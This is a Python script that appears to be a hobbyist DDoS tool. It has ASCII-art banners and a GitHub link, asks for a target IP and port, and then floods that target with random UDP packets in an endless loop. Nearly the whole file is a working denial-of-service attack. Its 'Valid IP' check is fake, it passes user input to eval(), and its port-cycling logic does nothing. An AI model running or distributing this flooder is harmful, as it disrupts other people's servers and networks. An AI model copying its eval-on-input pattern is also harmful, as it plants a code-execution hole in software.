#Lets import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError

validate = URLValidator()

#Lets start coding
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Lets define sock and bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
#Banner :
print('''
    ************************************************
    *                                              *
    *                                              * 
    *                                              *
    *                                                                        
                                                                  
  _______   ______    _______   ______    ______    ______        
 /       | /      \  /       | /      \  /      \  /      \       
/$$$$$$$/  $$$$$$  |/$$$$$$$/ /$$$$$$  |/$$$$$$  |/$$$$$$  |      
$$ |       /    $$ |$$      \ $$ |  $$ |$$    $$ |$$ |  $$/       
$$ \_____ /$$$$$$$ | $$$$$$  |$$ |__$$ |$$$$$$$$/ $$ |            
$$       |$$    $$ |/     $$/ $$    $$/ $$       |$$ |            
 $$$$$$$/  $$$$$$$/ $$$$$$$/  $$$$$$$/   $$$$$$$/ $$/             
                              $$ |                                
                              $$ |                                
                              $$/                                                                         *
    *                                              *
    *      UNBREAABLE LOADİNG KİNG                                          *
    *                                              *
    *                                              *
    ************************************************
    ************************************************
    *                                              *    
    *                                              *
    *          F!CK SOCİETY
                                                   *
    *                                              *
       GİTHUB PAGE: https://github.com/Casper2CR                                    * 
    *
                                                   *
    ************************************************
	''')
#Type your ip and port number (find IP address using nslookup or any online website) 
ip = input(" [+] Give A Target IP : ")
port = eval(input(" [+] Port NO : "))
os.system("clear")
print('''
    ************************************************
    *                                               *
    *                                              * 
    *                                              *
    *                                                                            
                  UNBREAABLE LOADİNG KİNG                                                 
  _______   ______    _______   ______    ______    ______        
 /       | /      \  /       | /      \  /      \  /      \       
/$$$$$$$/  $$$$$$  |/$$$$$$$/ /$$$$$$  |/$$$$$$  |/$$$$$$  |      
$$ |       /    $$ |$$      \ $$ |  $$ |$$    $$ |$$ |  $$/       
$$ \_____ /$$$$$$$ | $$$$$$  |$$ |__$$ |$$$$$$$$/ $$ |            
$$       |$$    $$ |/     $$/ $$    $$/ $$       |$$ |            
 $$$$$$$/  $$$$$$$/ $$$$$$$/  $$$$$$$/   $$$$$$$/ $$/             
                              $$ |                                
                              $$ |                                
                              $$/                                                                     *
    *                                              *
    *                                              *
    * GİTHUB PAGE: https://github.com/Casper2CR                                        *
    *                                              *
    ************************************************

	''')
try:
	validate = ip
	print(" ✅ Valid IP Checked.... ")
	print(" [+] Attack Screen Loading ....")
except ValidationError as exception :
	print(" ✘ Input a right url")

#Lets start our attack
print(" ")
print("    THİS İS MY JOB BABYYY ")
print(" " )
print(" [+] CASPER is attacking server " + ip )
print (" " )
time.sleep(5)
sent = 0
try :
 while True:
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		print("\n [+] Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
		if port == 65534:
			port = 1
except KeyboardInterrupt:
	print(" ")
	print("\n [-] .........Exiting")
	print(" [-] DDOS ATTACK STOPPED")
input(" Enter To Exit")
os.system("clear")
print(" [-] OHHH GHOST CASPER is SO tired...")
time.sleep(2)
